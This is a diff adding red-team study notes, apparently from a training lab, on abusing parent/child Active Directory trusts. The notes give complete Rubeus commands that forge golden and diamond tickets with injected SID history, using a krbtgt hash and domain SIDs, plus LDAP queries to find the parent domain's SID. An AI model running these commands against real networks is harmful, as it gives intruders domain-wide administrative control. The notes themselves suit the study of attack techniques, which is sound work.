@@ -46,3 +46,25 @@ inter-realm tickets (aka referral tickets)
     NOTE: once a trust has been created, the TGS of the trusting realm is registered as a principal with the trusted realm's KDC
           we can query for these trust accounts with...
             beacon> ldapsearch (samAccountType=805306370) --attributes samAccountName
+
+parent/child trust
+    if an adversary is able to gain domain admin privs in any child domain, they can elevate to any parent domain
+    this is achieved with a golden ticket with SID history (originally designed to support moving users from one domain to another)
+    this ticket can be crafted entirely offline:
+        PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-3926355307-1661546229-813047887-519 /nowrap
+            where...
+                /aes256 is the AES hash of the child domain's krbtgt account
+                /user is the user we want to impersonate
+                /domain is the child domain
+                /sid is the SID of the child domain
+                /sids is a list of SIDs we want to include in SID history
+                    NOTE: to find the parent SID we can use LDAP query
+                            beacon> ldapsearch (objectClass=domain) --attributes objectSid --hostname lon-dc-1.contoso.com --dn DC=contoso,DC=com
+    or this ticket can be created using the diamond technique:
+        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:S-1-5-21-3926355307-1661546229-813047887-512 /krbkey:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /nowrap
+            where...
+                /tgtdeleg gets a usable TGT for current user
+                /ticketuser is the user we want to impersonate
+                /ticketuserid is the RID of the impersonated user
+                /sids is a list of SIDs we want to include in SID history
+                /krbkey is the aes256 hash of child domain's krbtgt account
